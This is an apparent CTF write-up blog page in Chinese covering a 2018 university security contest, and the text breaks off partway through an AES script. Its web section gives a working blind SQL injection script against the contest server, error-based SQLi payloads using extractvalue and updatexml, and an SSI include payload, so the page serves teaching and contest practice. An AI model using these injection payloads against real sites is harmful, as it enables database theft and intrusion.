@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="刚打完这个比赛，整理了一下队伍的wp，感谢大手子们带飞，不得不说密码学的题属实有点难了，清华的大师傅都差点没做出来 webSimpleBlog主页提示和成绩为0有关登录进去看到提示:可能是二次注入或者文件包含，但是怎么都没找到文件包含的点有答题的界面 分数是随机的，就算点同一个选项也不会是相同的分数，但是成绩不会是0测试在用户名为 admin’时，注册登录后答题分数时0，但是有#号不会是0，猜想只">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018高校网络信息安全管理运维挑战赛wp">
+<meta property="og:url" content="http://yoursite.com/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/index.html">
+<meta property="og:site_name" content="Bling_Dog">
+<meta property="og:description" content="刚打完这个比赛，整理了一下队伍的wp，感谢大手子们带飞，不得不说密码学的题属实有点难了，清华的大师傅都差点没做出来 webSimpleBlog主页提示和成绩为0有关登录进去看到提示:可能是二次注入或者文件包含，但是怎么都没找到文件包含的点有答题的界面 分数是随机的，就算点同一个选项也不会是相同的分数，但是成绩不会是0测试在用户名为 admin’时，注册登录后答题分数时0，但是有#号不会是0，猜想只">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ebfe3a62b1ee88e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b34e74eef6bf8a8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1a10ef7e6bbbf862.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-5c6656b888f3f32f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-4b7c981386e33078.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-d41582bd9bb90f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-cb27bbdff7891267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-8a6e7034bdb07dd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-80a8261a90a16093.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-a21a99e304299271.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ffac8b393880bfec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-0fd8d880ed7d8f78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-5f95468e48c3c3d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-896755ad3c63811e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-4db5204a0d8ad1fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-aa3f06917a265265.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b74154ff114b66bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-cc3855d0234c6e48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ae169c57bcbbd33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-3519a84b3d7914e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-050316fb9101733d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-0d21fb3954d55deb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-86dc0e75482a97d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-3e9ee25e48e4a4fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-f08a9573acebe844.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-11-20T11:16:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018高校网络信息安全管理运维挑战赛wp">
+<meta name="twitter:description" content="刚打完这个比赛，整理了一下队伍的wp，感谢大手子们带飞，不得不说密码学的题属实有点难了，清华的大师傅都差点没做出来 webSimpleBlog主页提示和成绩为0有关登录进去看到提示:可能是二次注入或者文件包含，但是怎么都没找到文件包含的点有答题的界面 分数是随机的，就算点同一个选项也不会是相同的分数，但是成绩不会是0测试在用户名为 admin’时，注册登录后答题分数时0，但是有#号不会是0，猜想只">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-ebfe3a62b1ee88e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/">
+
+
+
+
+
+  <title>2018高校网络信息安全管理运维挑战赛wp | Bling_Dog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bling_Dog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">奔向大佬路上的小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bling_Dog">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bling_Dog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018高校网络信息安全管理运维挑战赛wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-17T18:23:38+08:00">
+                2018-11-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>刚打完这个比赛，整理了一下队伍的wp，感谢大手子们带飞，不得不说密码学的题属实有点难了，清华的大师傅都差点没做出来</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h2><p>主页提示和成绩为0有关<br><img src="https://upload-images.jianshu.io/upload_images/11234137-ebfe3a62b1ee88e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ebfe3a62b1ee88e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>登录进去看到提示:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b34e74eef6bf8a8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b34e74eef6bf8a8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>可能是二次注入或者文件包含，但是怎么都没找到文件包含的点<br>有答题的界面 分数是随机的，就算点同一个选项也不会是相同的分数，但是成绩不会是0<br>测试在用户名为 admin’时，注册登录后答题分数时0，但是有#号不会是0，猜想只有数据库逻辑错误分数才会是0<br>可以用布尔盲注，但是对于报错的方法，我用的是exp(),可以本地测试一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-1a10ef7e6bbbf862.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-1a10ef7e6bbbf862.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>图中可以知道 extractvalue在逻辑上总会报错，无论前面条件是否正确<br>而exp只有在前面条件正确时才会报错,根据这一点 写出脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">import string</span><br><span class="line">register_url = &quot;http://210.32.4.20/register.php&quot;</span><br><span class="line">login_url = &quot;http://210.32.4.20/login.php&quot;</span><br><span class="line">answer_url = &quot;http://210.32.4.20/answer.php&quot;</span><br><span class="line">guess = &quot;&#125;&#123;_&quot;+string.digits+string.ascii_letters+&quot;!@#$&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">print &quot;round: &quot;+ str(i)</span><br><span class="line">for j in guess:</span><br><span class="line">print &quot;[+]testing: &quot;+j</span><br><span class="line">tmp = ord(j)</span><br><span class="line">payload = &quot;1&apos; and if((ascii(substr((select flag from flag),&#123;&#125;,1))=&#123;&#125;),exp(~(select * from(select user())a)),1)#&quot;</span><br><span class="line">print payload.format(i,tmp)</span><br><span class="line">data1 = &#123;</span><br><span class="line">&quot;username&quot; : payload.format(i,tmp),</span><br><span class="line">&quot;password&quot; : &quot;aaa&quot;</span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">&quot;9.d&quot;:&quot;on&quot;</span><br><span class="line">&#125;</span><br><span class="line">re = requests.session()</span><br><span class="line">tt=re.post(register_url,data=data1)</span><br><span class="line">re.post(login_url,data=data1)</span><br><span class="line">res = re.post(answer_url,data2)</span><br><span class="line"># print res.text</span><br><span class="line">if &quot;&lt;script&gt;alert(&apos;Your grades is 0&apos;);&lt;/script&gt;&quot; in res.text:</span><br><span class="line">flag = flag+j</span><br><span class="line">break</span><br><span class="line">print &quot;flag: &quot;+flag</span><br></pre></td></tr></table></figure></p>
+<p>最后得到flag:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-5c6656b888f3f32f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5c6656b888f3f32f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h2 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h2><p>题目提示是ssi注入，flag在当前目录下，百度一篇文章<a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">安全脉搏</a>就有payload:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-4b7c981386e33078.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-4b7c981386e33078.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>修改文件名为flag即可<br><!--#include virtual="flag" --><br><img src="https://upload-images.jianshu.io/upload_images/11234137-d41582bd9bb90f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d41582bd9bb90f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h2 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h2><p>题目提示XXE flag在根目录下<br>抓个包<br>修改connntent-type 和post内容即可得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-cb27bbdff7891267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-cb27bbdff7891267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h2 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h2><p>看题目环境是和上一题一样，感觉完全可以用上一题方法做<br>读一下根目录有什么文件<br><img src="https://upload-images.jianshu.io/upload_images/11234137-8a6e7034bdb07dd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-8a6e7034bdb07dd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>发现了 flagvvvvvaaaagegsgag2333 文件<br>读一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-80a8261a90a16093.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-80a8261a90a16093.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h2 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h2><p>这个题当时卡了一下，因为当时只是在验证了在注册的时候的注入，但是服务器在注册脚本中写了过滤单引号之类的，一直无法绕过，最后尝试了一下登陆的注入，发现竟然没有过滤，然后报错注入得到结果。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;union select (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables),0x7e)))#</span><br></pre></td></tr></table></figure></p>
+<p>发现只爆出了flag的一部分<br><img src="https://upload-images.jianshu.io/upload_images/11234137-a21a99e304299271.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-a21a99e304299271.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后substr得到后面的结果:<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;union select (updatexml(1,concat(0x7e,substr((select flag from flag),28,50),0x7e),1))#</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-ffac8b393880bfec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ffac8b393880bfec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="RE-队友解出"><a href="#RE-队友解出" class="headerlink" title="RE(队友解出)"></a>RE(队友解出)</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>输入flag后进入sub_400647（）进行校验<br><img src="https://upload-images.jianshu.io/upload_images/11234137-0fd8d880ed7d8f78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-0fd8d880ed7d8f78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>进去先异或解密函数<br><img src="https://upload-images.jianshu.io/upload_images/11234137-5f95468e48c3c3d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5f95468e48c3c3d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后进去之后又会发现里面还有解密函数，受不了了，开始动态调，并且在flag下断点<br><img src="https://upload-images.jianshu.io/upload_images/11234137-896755ad3c63811e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-896755ad3c63811e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>接着就运行到读取flag的地方了，这是对flag的第一个字符进行处理计算，格式类似于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 = 101 * flag[6] + 101 * flag[6] * flag[6] + 13 * flag[6] * flag[6] * flag[6] + 25</span><br><span class="line">if ( v0 == 22215400 ):</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-4db5204a0d8ad1fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-4db5204a0d8ad1fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后还有比较验证，这里写脚本跑。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-aa3f06917a265265.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-aa3f06917a265265.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in range(0x20,0x7f):</span><br><span class="line">    tmp = i</span><br><span class="line">    v0 = 34 * tmp + 3 * tmp * tmp + 120 * tmp * tmp * tmp + 12</span><br><span class="line">    if v0 == 39437721:</span><br><span class="line">        print chr(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
+<p>后面都是重复同样的解密一段代码，然后对flag的一个字符进行判断，满足条件则对下一个字符进行验证，如此反复<br>解密的脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start = 0x419DD4</span><br><span class="line">end = 0x419F85 </span><br><span class="line">for i in range(end - start):</span><br><span class="line">	byte = get_byte(start+i)</span><br><span class="line">	p_byte = byte ^ 0x13</span><br><span class="line">	patch_byte(start+i,p_byte)</span><br></pre></td></tr></table></figure></p>
+<p>重复了52次总算是到了最后一个验证函数了（出题人真狠）<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b74154ff114b66bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b74154ff114b66bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>对52个字符进行逐位爆破，得到最终的flag，部分脚本如下（总共300多行··…….）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">for flag[47] in range(0x20, 0x7f):</span><br><span class="line">      v0 = 50 * flag[47] + 22 * flag[47] * flag[47] + 55 * flag[47] * flag[47] * flag[47] + 41</span><br><span class="line">      if ( v0 == 83944866 ):</span><br><span class="line">          flag[47] = chr(flag[47])</span><br><span class="line">          break</span><br><span class="line"></span><br><span class="line">for flag[48] in range(0x20, 0x7f):</span><br><span class="line">      v0 = 77 * flag[48] + 42 * flag[48] * flag[48] + 119 * flag[48] * flag[48] * flag[48] + 110</span><br><span class="line">      if ( v0 == 134321206 ):</span><br><span class="line">          flag[48] = chr(flag[48])</span><br><span class="line">          break</span><br><span class="line"></span><br><span class="line">for flag[49] in range(0x20, 0x7f):</span><br><span class="line">      v0 = 91 * flag[49] + 38 * flag[49] * flag[49] + 126 * flag[49] * flag[49] * flag[49] + 64</span><br><span class="line">      if ( v0 == 146289319 ):</span><br><span class="line">          flag[49] = chr(flag[49])</span><br><span class="line">          break</span><br><span class="line"></span><br><span class="line">for flag[50] in range(0x20, 0x7f):</span><br><span class="line">      v0 = 113 * flag[50] + 113 * flag[50] * flag[50] + 119 * flag[50] * flag[50] * flag[50] + 22</span><br><span class="line">      if ( v0 == 168616582 ):</span><br><span class="line">          flag[50] = chr(flag[50])</span><br><span class="line">          break</span><br><span class="line"></span><br><span class="line">for flag[51] in range(0x20, 0x7f):</span><br><span class="line">  v0 = 24 * flag[51] + 88 * flag[51] * flag[51] + 98 * flag[51] * flag[51] * flag[51] + 30</span><br><span class="line">  if ( v0 == 192784280 ):</span><br><span class="line">      flag[51] = chr(flag[51])</span><br><span class="line">      break</span><br><span class="line"></span><br><span class="line"># for flag[52] in range(0x20, 0x7f):</span><br><span class="line">#       v0 = 96 * flag[52] + 12 * flag[52] * flag[52] + 74 * flag[52] * flag[52] * flag[52] + 104</span><br><span class="line">#       if (v0 == 104):</span><br><span class="line">#           flag[52] = chr(flag[52])</span><br><span class="line">#           break</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;.join(flag)</span><br><span class="line">print(&quot;flag= &quot;+flag)</span><br></pre></td></tr></table></figure></p>
+<p>最后得到的flag：<br>EIS{you_should_go_for_nascondino_world_championship}</p>
+<h2 id="Tailbone"><a href="#Tailbone" class="headerlink" title="Tailbone"></a>Tailbone</h2><p>这里本来想修改为Intel的另一条指令aesdec，没想到兜了好大的圈子。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-cc3855d0234c6e48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-cc3855d0234c6e48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-ae169c57bcbbd33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ae169c57bcbbd33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们可以看到对于单轮运算，使用aesdec是逆不过来的。<br>所以我们必须对于每一步运算进行如下运算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor_key</span><br><span class="line">inv_mix_columns</span><br><span class="line">inv_shift_rows</span><br><span class="line">inv_sub_bytes</span><br></pre></td></tr></table></figure></p>
+<p>参考github上AES的实现，写出如下脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 